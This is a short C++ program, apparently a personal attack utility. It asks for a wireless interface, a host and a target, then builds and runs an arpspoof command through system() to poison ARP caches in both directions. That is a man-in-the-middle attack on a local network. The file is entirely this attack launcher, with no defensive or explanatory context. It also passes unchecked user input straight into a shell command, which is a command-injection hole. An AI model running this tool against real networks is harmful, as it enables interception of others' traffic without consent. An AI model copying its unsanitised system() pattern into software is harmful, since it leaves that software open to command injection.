#include<stdlib.h>
#include<iostream>
#include<string>
#include<string.h>
using namespace std;
int main(){
	string wir,host,ip,arp1;
	cout<<"wireless card:";
	cin>>wir;
	cout<<"host:";
	cin>>host;
	cout<<"target:";
	cin>>ip;
	arp1="arpspoof -i "+wir+" -c both "+" -t "+host+" "+ip;
	char cstr[arp1.size() + 1];
    strcpy(cstr, arp1.c_str());
	system(cstr);
	return 0;
}
 
